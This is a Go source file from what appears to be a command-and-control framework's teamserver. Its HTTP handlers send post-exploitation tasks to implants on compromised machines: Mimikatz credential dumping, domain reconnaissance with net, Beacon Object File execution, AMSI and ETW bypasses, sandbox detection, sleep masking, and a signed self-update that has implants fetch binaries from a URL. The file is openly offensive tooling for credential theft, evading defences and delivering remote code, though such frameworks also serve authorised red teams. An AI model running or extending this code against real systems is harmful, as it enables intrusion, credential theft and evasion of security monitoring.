package server

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"strings"

	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

// ── Post-ex: mimikatz / net / BOF / AMSI-ETW / evasion / self-update ───────

func (s *Server) handleMimikatz(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	cmd := c.PostForm("command")
	if cmd == "" {
		cmd = c.PostForm("target")
	}
	if cmd == "" {
		cmd = "sekurlsa::logonpasswords"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	// Auto-attach local module (data/modules/Invoke-Mimikatz.ps1) — no remote IEX.
	moduleB64 := s.loadMimikatzModuleB64()
	task := s.issueAgentTask(c, id, TaskSpec{Type: "mimikatz", Command: cmd, Data: moduleB64})
	if task == nil {
		return
	}
	detail := "Mimikatz: " + cmd
	if moduleB64 != "" {
		detail += " (module attached)"
	} else {
		detail += " (no server module; implant needs local script)"
	}
	slog.Info("mimikatz requested", "agent_id", id, "module_attached", moduleB64 != "")
	s.LogAuditRecord(c, "mimikatz", "agent", id, detail, true, nil)
	s.dispatchTask(c, task, "mimikatz", detail)
}

// ── BOF: Upload and execute Beacon Object File ─────────────────────────────
func (s *Server) handleNetCommand(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	command := c.PostForm("command")
	if command == "" {
		respondError(c, http.StatusBadRequest, "command is required (e.g. view, group /domain, localgroup Administrators, user, accounts, share)")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "net", Command: command})
	if task == nil {
		return
	}
	slog.Info("Net command requested", "agent_id", id, "command", truncateString(command, 100))
	s.LogAuditRecord(c, "net", "agent", id, "Net: "+command, true, nil)
	s.dispatchTask(c, task, "net", "Net: "+command)
}

func (s *Server) handleBOF(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	filename, b64Data, size, ok := s.handleFileUpload(c, "bof")
	if !ok {
		return
	}
	args := c.PostForm("args")

	task := s.issueAgentTask(c, id, TaskSpec{Type: "bof", Command: args, Data: b64Data})
	if task == nil {
		return
	}
	slog.Info("BOF execution requested", "agent_id", id, "file", filename, "size", size, "args", truncateString(args, 100))
	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", filename, size, args), true, nil)
	respond(c, gin.H{"task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", filename)})
}

// ── AMSI/ETW Bypass ────────────────────────────────────────────────────────

func (s *Server) handleAMSIByPass(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "amsi_bypass"})
	if task == nil {
		return
	}
	slog.Info("AMSI bypass requested", "agent_id", id)
	s.LogAuditRecord(c, "amsi_bypass", "agent", id, "AMSI bypass requested", true, nil)
	s.dispatchTask(c, task, "amsi_bypass", "AMSI Bypass")
}

func (s *Server) handleETWByPass(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "etw_bypass"})
	if task == nil {
		return
	}
	slog.Info("ETW bypass requested", "agent_id", id)
	s.LogAuditRecord(c, "etw_bypass", "agent", id, "ETW bypass requested", true, nil)
	s.dispatchTask(c, task, "etw_bypass", "ETW Bypass")
}

func (s *Server) handleAMSIHardwareBP(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "amsi_hardware_bp"})
	if task == nil {
		return
	}
	slog.Info("AMSI hardware breakpoint requested", "agent_id", id)
	s.LogAuditRecord(c, "amsi_hardware_bp", "agent", id, "AMSI hardware breakpoint bypass requested", true, nil)
	s.dispatchTask(c, task, "amsi_hardware_bp", "AMSI Hardware Breakpoint")
}

func (s *Server) handleETWHardwareBP(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "etw_hardware_bp"})
	if task == nil {
		return
	}
	slog.Info("ETW hardware breakpoint requested", "agent_id", id)
	s.LogAuditRecord(c, "etw_hardware_bp", "agent", id, "ETW hardware breakpoint bypass requested", true, nil)
	s.dispatchTask(c, task, "etw_hardware_bp", "ETW Hardware Breakpoint")
}

func (s *Server) handleRunEvasion(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	technique := c.PostForm("technique")
	if technique == "" {
		technique = c.Query("technique")
	}
	if technique == "" {
		respondError(c, http.StatusBadRequest, "technique parameter required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "run_evasion", Command: technique})
	if task == nil {
		return
	}
	slog.Info("Run evasion requested", "agent_id", id, "technique", technique)
	s.LogAuditRecord(c, "run_evasion", "agent", id, "Run evasion: "+technique, true, nil)
	s.dispatchTask(c, task, "run_evasion", "Run Evasion: "+technique)
}

func (s *Server) handleSandboxDetectAdvanced(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "sandbox_detect_advanced"})
	if task == nil {
		return
	}
	slog.Info("Advanced sandbox detection requested", "agent_id", id)
	s.LogAuditRecord(c, "sandbox_detect_advanced", "agent", id, "Advanced sandbox detection requested", true, nil)
	s.dispatchTask(c, task, "sandbox_detect_advanced", "Advanced Sandbox Detection")
}

func (s *Server) handleSetSleepMaskAdvanced(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "set_sleep_mask_advanced"})
	if task == nil {
		return
	}
	slog.Info("Advanced sleep mask requested", "agent_id", id)
	s.LogAuditRecord(c, "set_sleep_mask_advanced", "agent", id, "Advanced sleep mask activation requested", true, nil)
	s.dispatchTask(c, task, "set_sleep_mask_advanced", "Advanced Sleep Mask")
}

// ── Self-Update ────────────────────────────────────────────────────────────

// handleSelfUpdate dispatches a SIGNED self-update envelope. The implant
// pins the build-time update key and refuses anything it cannot verify, so
// the operator must supply the SHA-256 of the hosted binary; the teamserver
// signs that digest with its private half and ships the envelope
// {url, signature} to the agent.
//
// POST /agents/:id/self_update   url=... & sha256=<64 hex>
func (s *Server) handleSelfUpdate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	url := strings.TrimSpace(c.PostForm("url"))
	shaHex := strings.ToLower(strings.TrimSpace(c.PostForm("sha256")))
	if url == "" {
		respondError(c, http.StatusBadRequest, "download URL is required")
		return
	}
	if shaHex == "" {
		respondError(c, http.StatusBadRequest,
			"sha256 of the hosted binary is required (self_update is signature-enforced)")
		return
	}
	signature, err := payload.SignUpdateHash(shaHex)
	if err != nil {
		slog.Warn("Failed to sign update hash", "agent_id", id, "error", err)
		respondError(c, http.StatusBadRequest, sanitizeError(err, "update signing"))
		return
	}
	envelope, err := json.Marshal(map[string]string{"url": url, "signature": signature})
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to encode update command")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "self_update", Command: string(envelope)})
	if task == nil {
		return
	}
	sigShort := signature[:16] + "…"
	slog.Info("Self-update requested", "agent_id", id, "url", url, "sig", sigShort)
	s.LogAuditRecord(c, "self_update", "agent", id,
		"Self-update: "+url+" sig="+sigShort, true, nil)
	s.dispatchTask(c, task, "self_update", "Self-Update ("+url+")")
}
